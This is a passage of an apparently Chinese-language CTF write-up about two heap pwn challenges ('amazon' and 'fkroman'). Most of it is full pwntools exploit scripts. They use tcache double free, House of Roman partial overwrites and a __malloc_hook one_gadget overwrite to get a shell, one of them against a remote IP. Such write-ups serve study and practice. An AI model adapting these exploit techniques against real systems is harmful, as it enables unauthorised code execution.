class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = 'debug'</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">'./amazon'</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=remote(\"121.41.38.38\",9999)</span></span><br><span class=\"line\">libc=ELF(<span class=\"string\">\"./libc-2.27.so\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">g</span><span class=\"params\">(p,data=False)</span>:</span></span><br><span class=\"line\">    gdb.attach(p,data)</span><br><span class=\"line\">    raw_input()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">ru</span><span class=\"params\">(x)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> p.recvuntil(x)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">se</span><span class=\"params\">(x)</span>:</span></span><br><span class=\"line\">    p.send(x)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">sl</span><span class=\"params\">(x)</span>:</span></span><br><span class=\"line\">    p.sendline(x)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">rl</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> p.recvline()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">re</span><span class=\"params\">(x)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> p.recv(x)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(idx,price,length,data)</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">\"Your choice: \"</span>)</span><br><span class=\"line\">    sl(str(<span class=\"number\">1</span>))</span><br><span class=\"line\">    ru(<span class=\"string\">\"uy: \"</span>)</span><br><span class=\"line\">    sl(str(idx))</span><br><span class=\"line\">    ru(<span class=\"string\">\"many: \"</span>)</span><br><span class=\"line\">    sl(str(price))</span><br><span class=\"line\">    ru(<span class=\"string\">\"note: \"</span>)</span><br><span class=\"line\">    sl(str(length))</span><br><span class=\"line\">    ru(<span class=\"string\">\"tent: \"</span>)</span><br><span class=\"line\">    se(data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add2</span><span class=\"params\">(idx,price,length)</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">\"Your choice: \"</span>)</span><br><span class=\"line\">    sl(str(<span class=\"number\">1</span>))</span><br><span class=\"line\">    ru(<span class=\"string\">\"uy: \"</span>)</span><br><span class=\"line\">    sl(str(idx))</span><br><span class=\"line\">    ru(<span class=\"string\">\"many: \"</span>)</span><br><span class=\"line\">    sl(str(price))</span><br><span class=\"line\">    ru(<span class=\"string\">\"note: \"</span>)</span><br><span class=\"line\">    sl(str(length))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">\"Your choice: \"</span>)</span><br><span class=\"line\">    sl(str(<span class=\"number\">2</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">\"Your choice: \"</span>)</span><br><span class=\"line\">    sl(str(<span class=\"number\">3</span>))</span><br><span class=\"line\">    ru(<span class=\"string\">\"for: \"</span>)</span><br><span class=\"line\">    sl(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x90</span>,<span class=\"string\">\"1\"</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x80</span>,p64(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x30</span>,<span class=\"string\">\"3\"</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x20</span>,<span class=\"string\">\";$0\\x00\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x20</span>,<span class=\"string\">\"2\"</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">show()</span><br><span class=\"line\">ru(<span class=\"string\">\"Name: \"</span>)</span><br><span class=\"line\">heap=u64(re(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">\"\\x00\"</span>))<span class=\"number\">-0x260</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(heap)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">6</span>):</span><br><span class=\"line\">    free(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">show()</span><br><span class=\"line\">ru(<span class=\"string\">\"Name: \"</span>)</span><br><span class=\"line\">lib=u64(re(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">\"\\x00\"</span>))<span class=\"number\">-0x3ebca0</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(lib)</span><br><span class=\"line\"></span><br><span class=\"line\">hook=libc.symbols[<span class=\"string\">\"__malloc_hook\"</span>]</span><br><span class=\"line\">hook=lib+hook</span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(hook)</span><br><span class=\"line\">one=lib+<span class=\"number\">0x10a38c</span></span><br><span class=\"line\"><span class=\"comment\"># one=lib+0x4f2c5</span></span><br><span class=\"line\">realloc=lib+libc.symbols[<span class=\"string\">\"realloc\"</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x80</span>,<span class=\"string\">\"y\"</span>*<span class=\"number\">0x60</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x51</span>)+p64(lib+<span class=\"number\">0x3ebce0</span>)*<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x90</span>,<span class=\"string\">\"1\"</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x90</span>,p64(lib+<span class=\"number\">0x3ebcb0</span>)*<span class=\"number\">2</span>+p64(lib+<span class=\"number\">0x3ebcc0</span>)*<span class=\"number\">2</span>+p64(lib+<span class=\"number\">0x3ebcd0</span>)*<span class=\"number\">2</span>+p64(heap+<span class=\"number\">0x340</span>+<span class=\"number\">0x60</span>)*<span class=\"number\">2</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x20</span>,p64(hook<span class=\"number\">-0x28</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x30</span>,<span class=\"string\">\"wwe\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x30</span>,p64(one)+p64(realloc+<span class=\"number\">0x9</span>))</span><br><span class=\"line\">    </span><br><span class=\"line\">add2(<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0x60</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"fkroman\"><a href=\"#fkroman\" class=\"headerlink\" title=\"fkroman\"></a>fkroman</h2><p>这题算是我做出来了，防护全开且漏洞很明显，但是缺少leak libc的方法，所以只能爆破。事实上，本题和2018强网杯的一道题基本一摸一样，只不过添加了一个<code>sleep(5)</code>恶心你。</p>\n<p>我在比赛时搜到本题是<code>House of Roman</code>的构造，然后找到一个exp本地可以，最终时间不够未能远程爆破成功，有些遗憾吧。</p>\n<p>具体的构造思路实际上非常常规，只不过由于Pie的开启使得随机性过于强。</p>\n<p>基本照搬的原来强网杯的exp，就是简单改了改，感兴趣的读者可以去看相应的博客。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</span><br><span class=\"line\"><span class=\"comment\"># elf = ELF(\"./fkroman\")</span></span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./fkroman\",env=&#123;\"LD_PRELOAD\":\"./libc-2.23.so\"&#125;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"121.40.246.48\"</span>, <span class=\"number\">9999</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">create</span><span class=\"params\">(size, index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice: \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index: \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Size: \"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice: \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index: \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(index, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice: \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index: \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Size: \"</span>)</span><br><span class=\"line\">\tp.sendline(str(len(content)))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Content: \"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\">create(<span class=\"number\">0x18</span>,<span class=\"number\">0</span>) <span class=\"comment\"># 0x20</span></span><br><span class=\"line\">create(<span class=\"number\">0xc8</span>,<span class=\"number\">1</span>) <span class=\"comment\"># d0</span></span><br><span class=\"line\">create(<span class=\"number\">0x65</span>,<span class=\"number\">2</span>)  <span class=\"comment\"># 0x70</span></span><br><span class=\"line\"></span><br><span class=\"line\">info(<span class=\"string\">\"create 2 chunk, 0x20, 0xd8\"</span>)</span><br><span class=\"line\">fake = <span class=\"string\">\"A\"</span>*<span class=\"number\">0x68</span></span><br><span class=\"line\">fake += p64(<span class=\"number\">0x61</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,fake)</span><br><span class=\"line\">info(<span class=\"string\">\"fake\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">create(<span class=\"number\">0xc8</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x65</span>,<span class=\"number\">3</span>)  <span class=\"comment\"># b</span></span><br><span class=\"line\">create(<span class=\"number\">0x65</span>,<span class=\"number\">15</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x65</span>,<span class=\"number\">18</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">over = <span class=\"string\">\"A\"</span>*<span class=\"number\">0x18</span>  <span class=\"comment\"># off by one</span></span><br><span class=\"line\">over += <span class=\"string\">\"\\x71\"</span>  <span class=\"comment\"># set chunk  1's size --&gt; 0x71</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,over)</span><br><span class=\"line\">info(<span class=\"string\">\"利用 off by one ,  chunk  1's size --&gt; 0x71\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">info(<span class=\"string\">\"创建两个 0x70 的 fastbin\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">heap_po = <span class=\"string\">\"\\x20\"</span></span><br><span class=\"line\">edit(<span class=\"number\">3</span>,heap_po)</span><br><span class=\"line\">info(<span class=\"string\">\"把 chunk'1 链入到 fastbin 里面\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># malloc_hook 上方</span></span><br><span class=\"line\">malloc_hook_nearly = <span class=\"string\">\"\\xed\\x1a\"</span></span><br><span class=\"line\">edit(<span class=\"number\">1</span>,malloc_hook_nearly)</span><br><span class=\"line\"></span><br><span class=\"line\">info(<span class=\"string\">\"部分写，修改 fastbin-&gt;fd ---&gt; malloc_hook\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x65</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x65</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x65</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">info(<span class=\"string\">\"0 拿到了 malloc_hook\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">15</span>)</span><br><span class=\"line\">edit(<span class=\"number\">15</span>,p64(<span class=\"number\">0x00</span>))</span><br><span class=\"line\">info(<span class=\"string\">\"再次生成 0x71 的 fastbin, 同时修改 fd =0, 修复 fastbin\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0xc8</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">create(<span class=\"number\">0xc8</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x18</span>,<span class=\"number\">2</span>)</span><br><span class=\"line\">create(<span class=\"number\">0xc8</span>,<span class=\"number\">3</span>)</span><br><span class=\"line\">create(<span class=\"number\">0xc8</span>,<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">po = <span class=\"string\">\"B\"</span>*<span class=\"number\">8</span></span><br><span class=\"line\">po += <span class=\"string\">\"\\x00\\x1b\"</span></span><br><span class=\"line\">edit(<span class=\"number\">1</span>,po)</span><br><span class=\"line\">create(<span class=\"number\">0xc8</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">info(<span class=\"string\">\"unsorted bin 使得 malloc_hook 有 libc 的地址\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">over = <span class=\"string\">\"R\"</span>*<span class=\"number\">0x13</span>   <span class=\"comment\"># padding for malloc_hook</span></span><br><span class=\"line\">over += <span class=\"string\">\"\\xa4\\xd2\\xbf\"</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,over)</span><br><span class=\"line\"></span><br><span class=\"line\">info(<span class=\"string\">\"malloc_hook to one_gadget\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">18</span>)</span><br><span class=\"line\">free(<span class=\"number\">18</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"double free or corruption\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">sleep(<span class=\"number\">0.2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">\"uname -a\"</span>)</span><br><span class=\"line\">data = p.recvuntil(<span class=\"string\">\"GNU/Linux\"</span>, timeout=<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"string\">\"Linux\"</span> <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">    p.interactive()</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    exit(<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><p><a href=\"https://mp.weixin.qq.com/s/A0T1VJmfvPcWaBD5ubrbPA\" target=\"_blank\" rel=\"noopener\">ChaMD5 Writeup</a></p>\n<p><a href=\"https://xz.aliyun.com/t/2316\" target=\"_blank\" rel=\"noopener\">某博客</a></p>\n<p>[强网杯原题exp](</p>\n<p>7f5bda882000</p>\n<p>7f294b801000</p>\n","categories":[],"tags":[{"name":"pwn","slug":"pwn","count":9,"path":"api/tags/pwn.json"}]}